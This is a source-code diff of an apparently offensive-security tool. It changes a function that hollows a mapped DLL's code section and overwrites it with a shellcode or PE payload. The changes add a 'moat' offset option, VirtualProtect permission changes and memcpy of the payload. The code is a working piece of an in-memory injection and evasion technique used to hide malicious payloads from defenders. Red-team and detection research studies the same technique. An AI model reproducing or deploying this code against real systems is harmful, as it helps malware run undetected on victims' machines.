@@ -255,62 +255,74 @@ bool HollowDllImplant(const wchar_t* DllFilePath, uint8_t** ppMapBuf, uint64_t* 
 									bHollowed = true;
 								}
 								else if (*pqwMapBufSize >= dwRequiredSize) { // Verify that the mapped size is of sufficient size for the payload+moat. There are quirks to image mapping that can result in the image size not matching the mapped size.
-									*ppEntryPoint = (SelectedPayloadType == Payload_t::PE ? *ppMapBuf : (*ppMapBuf + (pSectHdrs + nCodeIndex)->VirtualAddress + dwCodeRva));
-									printf("... %ws - 0x%p [payload base: 0x%p] mapped size: %I64u\r\n", DllFilePath, *ppMapBuf, *ppEntryPoint, *pqwMapBufSize);
-
 									if (pPayloadBuf != nullptr) {
 										if (SelectedPayloadType == Payload_t::Shellcode) {
 											uint32_t dwOldProtect = 0;
-											MEMORY_BASIC_INFORMATION64 BasicInfo = { 0 };
-											bool bValidSblock = true;
 
-											printf("... selected code section %s (index %d) for hollowing at 0x%p\r\n", (pSectHdrs + nCodeIndex)->Name, nCodeIndex, *ppEntryPoint);
+											if ((qwImplantFlags & IMPLANT_FLAG_MOAT)) {
+												*ppEntryPoint = (*ppMapBuf + dwMoatSize);
 
-											//
-											// In some cases (.NET commonly among them) the code section may carry the executable permission on disk, but after being mapped will lose this attribute and become readonly. Query the sblocks associated with the selected code hollow pointer and modify their permissions to include +X if needed.
-											//
-
-											if (VirtualQueryEx(GetCurrentProcess(), *ppEntryPoint, (MEMORY_BASIC_INFORMATION*)&BasicInfo, sizeof(MEMORY_BASIC_INFORMATION)) == sizeof(MEMORY_BASIC_INFORMATION)) {
-												if ((*ppEntryPoint + dwPayloadBufSize) < ((uint8_t*)BasicInfo.BaseAddress + BasicInfo.RegionSize)) { // In the event that the code section has been split into multiple sblocks with varying different permissions, skip it and fail the hollowing.
-													printf("... sblock at 0x%p has sufficient size to include the entire payload.\r\n", BasicInfo.BaseAddress);
-
-													if (BasicInfo.Protect != PAGE_EXECUTE_READ && BasicInfo.Protect != PAGE_EXECUTE_READWRITE && BasicInfo.Protect != PAGE_EXECUTE_WRITECOPY) {
-														printf("... non-executable code section sblock.\r\n");
-
-														if (BasicInfo.Protect == PAGE_READWRITE) {
-															if (!VirtualProtect(*ppEntryPoint, dwPayloadBufSize, PAGE_EXECUTE_READWRITE, (PDWORD)&dwOldProtect)) {
-																bValidSblock = false;
-															}
-														}
-														else {
-															if (!VirtualProtect(*ppEntryPoint, dwPayloadBufSize, PAGE_EXECUTE_READ, (PDWORD)&dwOldProtect)) {
-																bValidSblock = false;
-															}
-														}
-													}
-												}
-												else {
-													printf("... sblock at 0x%p does not have sufficient size to include the entire payload.\r\n", BasicInfo.BaseAddress);
-													bValidSblock = false;
-												}
-											}
-											else {
-												printf("... failed to query attributes of virtual memory corresponding to hollowed code at 0x%p\r\n", *ppEntryPoint);
-												bValidSblock = false;
-											}
-
-											if (bValidSblock) {
 												if (VirtualProtect(*ppEntryPoint, dwPayloadBufSize, PAGE_READWRITE, (PDWORD)&dwOldProtect)) {
 													memcpy(*ppEntryPoint, pPayloadBuf, dwPayloadBufSize);
 
-													//if (VirtualProtect(*ppEntryPoint, dwPayloadBufSize, PAGE_EXECUTE_READ, (PDWORD)&dwOldProtect)) {
-													if (VirtualProtect(*ppEntryPoint, dwPayloadBufSize, dwOldProtect, (PDWORD)&dwOldProtect)) {
+													if (VirtualProtect(*ppEntryPoint, dwPayloadBufSize, PAGE_EXECUTE_READ, (PDWORD)&dwOldProtect)) {
 														bHollowed = true;
 													}
 												}
 											}
 											else {
-												printf("... sblock for code section to hollow is invalid, either due to multiple sblocks or an inability to reset its permissions correctly.\r\n");
+												MEMORY_BASIC_INFORMATION64 BasicInfo = { 0 };
+												bool bValidSblock = true;
+
+												*ppEntryPoint = (*ppMapBuf + (pSectHdrs + nCodeIndex)->VirtualAddress);
+												printf("... selected code section %s (index %d) for hollowing at 0x%p\r\n", (pSectHdrs + nCodeIndex)->Name, nCodeIndex, *ppEntryPoint);
+
+												//
+												// In some cases (.NET commonly among them) the code section may carry the executable permission on disk, but after being mapped will lose this attribute and become readonly. Query the sblocks associated with the selected code hollow pointer and modify their permissions to include +X if needed.
+												//
+
+												if (VirtualQueryEx(GetCurrentProcess(), *ppEntryPoint, (MEMORY_BASIC_INFORMATION*)&BasicInfo, sizeof(MEMORY_BASIC_INFORMATION)) == sizeof(MEMORY_BASIC_INFORMATION)) {
+													if ((*ppEntryPoint + dwPayloadBufSize) < ((uint8_t*)BasicInfo.BaseAddress + BasicInfo.RegionSize)) { // In the event that the code section has been split into multiple sblocks with varying different permissions, skip it and fail the hollowing.
+														printf("... sblock at 0x%p has sufficient size to include the entire payload.\r\n", BasicInfo.BaseAddress);
+
+														if (BasicInfo.Protect != PAGE_EXECUTE_READ && BasicInfo.Protect != PAGE_EXECUTE_READWRITE && BasicInfo.Protect != PAGE_EXECUTE_WRITECOPY) {
+															printf("... non-executable code section sblock.\r\n");
+
+															if (BasicInfo.Protect == PAGE_READWRITE) {
+																if (!VirtualProtect(*ppEntryPoint, dwPayloadBufSize, PAGE_EXECUTE_READWRITE, (PDWORD)&dwOldProtect)) {
+																	bValidSblock = false;
+																}
+															}
+															else {
+																if (!VirtualProtect(*ppEntryPoint, dwPayloadBufSize, PAGE_EXECUTE_READ, (PDWORD)&dwOldProtect)) {
+																	bValidSblock = false;
+																}
+															}
+														}
+													}
+													else {
+														printf("... sblock at 0x%p does not have sufficient size to include the entire payload.\r\n", BasicInfo.BaseAddress);
+														bValidSblock = false;
+													}
+												}
+												else {
+													printf("... failed to query attributes of virtual memory corresponding to hollowed code at 0x%p\r\n", *ppEntryPoint);
+													bValidSblock = false;
+												}
+
+												if (bValidSblock) {
+													if (VirtualProtect(*ppEntryPoint, dwPayloadBufSize, PAGE_READWRITE, (PDWORD)&dwOldProtect)) {
+														memcpy(*ppEntryPoint, pPayloadBuf, dwPayloadBufSize);
+
+														//if (VirtualProtect(*ppEntryPoint, dwPayloadBufSize, PAGE_EXECUTE_READ, (PDWORD)&dwOldProtect)) {
+														if (VirtualProtect(*ppEntryPoint, dwPayloadBufSize, dwOldProtect, (PDWORD)&dwOldProtect)) {
+															bHollowed = true;
+														}
+													}
+												}
+												else {
+													printf("... sblock for code section to hollow is invalid, either due to multiple sblocks or an inability to reset its permissions correctly.\r\n");
+												}
 											}
 										}
 										else if (SelectedPayloadType == Payload_t::PE) {
@@ -332,6 +344,10 @@ bool HollowDllImplant(const wchar_t* DllFilePath, uint8_t** ppMapBuf, uint64_t* 
 									}
 									else {
 										bHollowed = true;
+									}
+
+									if (bHollowed) {
+										printf("... %ws - 0x%p [payload base: 0x%p] mapped size: %I64u\r\n", DllFilePath, *ppMapBuf, *ppEntryPoint, *pqwMapBufSize);
 									}
 								}
 								else {
